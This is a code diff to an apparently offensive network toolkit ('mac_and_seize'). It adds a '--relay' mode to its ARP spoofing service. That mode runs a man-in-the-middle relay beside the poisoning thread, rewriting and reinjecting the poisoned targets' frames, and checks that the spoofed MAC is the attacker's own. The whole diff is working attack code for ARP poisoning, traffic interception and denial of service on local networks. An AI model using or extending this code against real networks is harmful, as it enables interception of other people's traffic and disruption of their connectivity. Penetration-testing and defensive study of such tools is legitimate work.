@@ -40,7 +40,7 @@ from typing import TYPE_CHECKING
 from scapy.layers.l2 import ARP, Ether
 
 from mac_and_seize.core.errors import ModuleError
-from mac_and_seize.net.adapters import scapy_io
+from mac_and_seize.net.adapters import netifaces_io, scapy_io
 from mac_and_seize.observability import get_logger
 
 if TYPE_CHECKING:
@@ -136,6 +136,22 @@ def _validate_method(value: str) -> str:
             f"{', '.join(_METHODS)}."
         )
     return text
+
+
+def _read_iface_mac(iface: str) -> str:
+    """Return the interface's own MAC (lower-case, colon form).
+
+    Used only by the :meth:`ArpSpoofService.spoof` ``--relay`` pre-flight to
+    verify the claimed MAC is our own - a mismatched claim would route
+    poisoned traffic away from us and make the relay a no-op.
+    """
+    _ipv4, _ipv6, mac = netifaces_io.read_addresses(iface)
+    hardware = next((item for item in (mac.get("addr") or []) if item), None)
+    if not hardware or not _MAC_RE.match(str(hardware)):
+        raise ModuleError(
+            f"Could not read the MAC address of {iface!r}; is the interface up?"
+        )
+    return str(hardware).lower()
 
 
 def _plan_sends(
@@ -245,6 +261,10 @@ class ArpSpoofJob:
     thread: threading.Thread | None = None
     task: object | None = None
     sent: int = 0
+    #: When ``lan arp spoof --relay`` is used, the relay handle for the flow
+    #: the RelayService set up alongside the poison thread. Torn down in
+    #: :meth:`_finalize` when the job stops.
+    relay_handle: object | None = None
 
     @property
     def key(self) -> tuple[str, str]:
@@ -271,6 +291,7 @@ class ArpSpoofService:
         method: str,
         *,
         target: str | None,
+        relay: bool = False,
     ) -> str:
         """Start a background ARP spoof (raises if the same job is already up).
 
@@ -282,6 +303,13 @@ class ArpSpoofService:
         ``gratuitous`` mode it also drives the subnet-broadcast computation).
         Returns immediately - the job runs in the background and the prompt
         stays usable.
+
+        When ``relay`` is set, a one-way L2 MiTM relay is started alongside
+        the poison thread. Frames from the poisoned target(s) that arrive at
+        ``mac`` get their dst-MAC rewritten to ``ip``'s real MAC and are
+        reinjected on ``interface``. The relay uses the shared
+        :class:`~mac_and_seize.modules.relay.service.RelayService`; it is
+        torn down when the spoof stops.
         """
         iface = (interface or "").strip()
         if not iface:
@@ -306,10 +334,54 @@ class ArpSpoofService:
                 f"--target {target!r} produced no frames to send."
             )
 
+        # Pre-flight for --relay: poisoned traffic will only reach us if the
+        # claimed MAC is the interface's own MAC. Anything else and the frames
+        # go to some other host on the segment (or the void), so the relay
+        # would never fire. Refuse up front with a helpful message rather
+        # than launching an inert relay - fits the same "fail before task
+        # registered" pattern the DHCP starve uses. Non-relay spoofs are
+        # allowed to point at any MAC (a pure DoS is a legitimate use).
+        if relay:
+            our_mac = _read_iface_mac(iface)
+            if our_mac != spoofer_mac:
+                raise ModuleError(
+                    f"--relay needs the claimed MAC to be {iface}'s own MAC "
+                    f"({our_mac}), otherwise poisoned traffic goes to some "
+                    "other host and the relay never sees a frame. Re-run "
+                    f"with {our_mac} as the claimed MAC (arg #3), or omit "
+                    "--relay for a pure spoof/DoS."
+                )
+
+        # Start the relay *before* the poison thread. If it fails, the caller
+        # sees a clean error and no spoof runs. When it succeeds, the handle
+        # is stored on the job so :meth:`_finalize` can tear it down.
+        relay_handle: object | None = None
+        if relay:
+            victim_ips = [victim_ip for victim_ip, _mac in targets]
+            try:
+                relay_handle = context.service("relay").begin_l2_onseg(
+                    context,
+                    iface=iface,
+                    spoofed_ip=spoofed_ip,
+                    victim_ips=victim_ips,
+                )
+            except KeyError as exc:
+                raise ModuleError(
+                    "The 'relay' module is not loaded; cannot start --relay "
+                    "for lan arp spoof."
+                ) from exc
+
         key = (iface, spoofed_ip)
         with self._lock:
             self._reap_locked()
             if key in self._jobs:
+                if relay_handle is not None:
+                    try:
+                        context.service("relay").end(relay_handle)
+                    except Exception:  # noqa: BLE001
+                        self._log.debug(
+                            "ARP: relay rollback failed", exc_info=True,
+                        )
                 raise ModuleError(
                     f"An ARP spoof is already running for {spoofed_ip} on "
                     f"{iface!r}; stop it first."
@@ -323,6 +395,7 @@ class ArpSpoofService:
                 sends=sends,
                 stop_event=threading.Event(),
                 started_at=time.monotonic(),
+                relay_handle=relay_handle,
             )
             job.thread = threading.Thread(
                 target=self._run,
@@ -337,16 +410,17 @@ class ArpSpoofService:
             self._jobs[key] = job
             job.thread.start()
 
+        relay_suffix = " Relay is active (Python bridge)." if relay else ""
         if method == "reply":
             return (
                 f"ARP spoof started on {iface} (reply): telling {len(sends)} "
-                f"target(s) that {spoofed_ip} is at {spoofer_mac}. "
+                f"target(s) that {spoofed_ip} is at {spoofer_mac}.{relay_suffix} "
                 f"Stop every running spoof with 'lan arp stop'."
             )
         return (
             f"ARP spoof started on {iface} (gratuitous): announcing "
             f"{spoofed_ip} is at {spoofer_mac} to {len(sends)} subnet(s) "
-            f"via directed broadcast. "
+            f"via directed broadcast.{relay_suffix} "
             f"Stop every running spoof with 'lan arp stop'."
         )
 
@@ -426,6 +500,16 @@ class ArpSpoofService:
         context = self._context
         if job.task is not None and context is not None:
             context.tasks.finish(job.task)
+
+        # Tear down the coupled relay handle alongside the poison thread; the
+        # relay outlives no useful state once we stop poisoning. Idempotent:
+        # RelayService.end() drops unknown handles silently.
+        if job.relay_handle is not None and context is not None:
+            try:
+                context.service("relay").end(job.relay_handle)
+            except Exception:  # noqa: BLE001 - teardown must not raise at the prompt
+                self._log.debug("ARP: relay teardown failed", exc_info=True)
+            job.relay_handle = None
 
         # A user-driven stop (stop_event set by stop_all()) is reported by that
         # command; stay quiet to avoid a duplicate line. A job that ended on
